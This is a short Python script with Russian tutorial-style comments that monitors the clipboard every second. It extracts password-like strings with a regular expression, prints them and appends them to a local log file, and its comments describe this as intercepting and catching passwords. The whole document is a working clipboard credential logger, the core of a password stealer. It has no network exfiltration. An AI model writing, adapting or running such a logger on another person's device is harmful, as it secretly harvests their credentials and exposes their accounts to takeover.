# Импортируем модуль для работы с регулярными выражениями
import regex as re
# Подключим модуль для работы с буфером обмена
# (В Linux если нет pip3, apt-get install python3-pip)
# В командной строке или терминале pip install pyperclip
# Для Linux pip3 install pyperclip
import pyperclip
# Подключим модуль для работы с системным временем
import time

# Функция - это кусочек программы имеющий имя, по которому его можно вызвать
# В скобках внутрь функции передаются какие-то аргументы
# Эта функция будет принимать строку txt и возвращать найденные в ней пароли
def getpasswords(txt):
    # С помощью магии регулярных выражений вытаскиваем из строки пароли
    # Подробнее о регулярных выражениях тут: https://habr.com/ru/post/349860/
    rx = re.compile(r'(?=\d++[A-Za-z]+[\w@]+|[a-zA-Z]++[\w@]+)[\w@]{2,}')
    # return возвращает результат функции
    return rx.findall(txt)

# Изначально в переменной old будет пусто
old = ''
# Начнем бесконечный цикл слежения за буфером обмена c помощью while True:
while True:
    # Получаем в переменную s содержимое буфера обмена
    h = pyperclip.paste()
    # Если полученное содержимое не равно предыдущему то:
    if h != old and not 'http' in h:
        # печатаем перехваченные пароли
        r = getpasswords(h)
        if r != []:
            print(r)
            # Откроем файл в который будем записывать логи с пойманными паролями
            logfile = open('log.txt', 'a', encoding = 'UTF-8')
            # Запишем пароли в логи
            for password in r:
                logfile.write(password + '\n')
            # Закроем файл
            logfile.close()
        # в переменную old записываем текущее пойманное значение
        # чтобы в следующий виток цикла не повторяться и не печатать то что уже поймано
        old = h
    # в конце витка цикла делаем паузу в одну секунду чтобы содержимое буфера обмена успело прогрузиться
    time.sleep(1)

